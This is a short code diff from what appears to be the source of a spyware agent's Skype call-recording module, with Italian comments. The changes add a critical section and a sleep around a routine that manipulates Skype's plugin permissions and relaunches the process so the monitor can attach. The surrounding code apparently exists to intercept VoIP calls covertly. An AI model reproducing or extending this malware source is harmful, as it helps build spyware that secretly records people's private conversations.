@@ -104,6 +104,7 @@ typedef struct _VoiceAdditionalData {
 #define INPUT_ELEM 0
 #define OUTPUT_ELEM 1
 
+CRITICAL_SECTION skype_critic_sec;
 partner_entry *call_list_head = NULL;
 BOOL bPM_VoipRecordStarted = FALSE; // Flag che indica se il monitor e' attivo o meno
 DWORD sample_size[2] = {0,0};        // Viene inizializzato solo all'inizio
@@ -2223,6 +2224,7 @@ void CheckSkypePluginPermissions(DWORD skype_pid, WCHAR *skype_path)
 			CloseHandle(hSkype);
 			ZeroMemory( &si, sizeof(si) );
 		    si.cb = sizeof(si);
+			Sleep(1000); // Da' un po' di tempo per killare il processo
 			//si.wShowWindow = SW_SHOW;
 			//si.dwFlags = STARTF_USESHOWWINDOW;
 			if (hToken = GetMediumLevelToken()) {
@@ -2264,7 +2266,9 @@ DWORD WINAPI MonitorSkypePM(BOOL *semaphore)
 							CloseHandle(fileh);
 						else  {// Non c'e' lo skypePM quindi cerca di fare l'attach al processo
 							// Prima di cercare di fare l'attach controlla che ci siano i giusti permessi...
+							EnterCriticalSection(&skype_critic_sec);
 							CheckSkypePluginPermissions(skipe_id, skype_path);
+							LeaveCriticalSection(&skype_critic_sec);
 							UINT msg_type = RegisterWindowMessage("SkypeControlAPIDiscover");
 							HM_SafeSendMessageTimeoutW(HWND_BROADCAST, msg_type, (WPARAM)g_report_hwnd, (LPARAM)NULL, SMTO_NORMAL, 500, NULL);
 						}
@@ -2804,6 +2808,7 @@ DWORD __stdcall PM_VoipRecordUnregister()
 
 void PM_VoipRecordRegister()
 {
+	InitializeCriticalSection(&skype_critic_sec);
 	// L'hook viene registrato dalla funzione HM_InbundleHooks
 	AM_MonitorRegister(PM_VOIPRECORDAGENT, (BYTE *)PM_VoipRecordDispatch, (BYTE *)PM_VoipRecordStartStop, (BYTE *)PM_VoipRecordInit, (BYTE *)PM_VoipRecordUnregister);
 
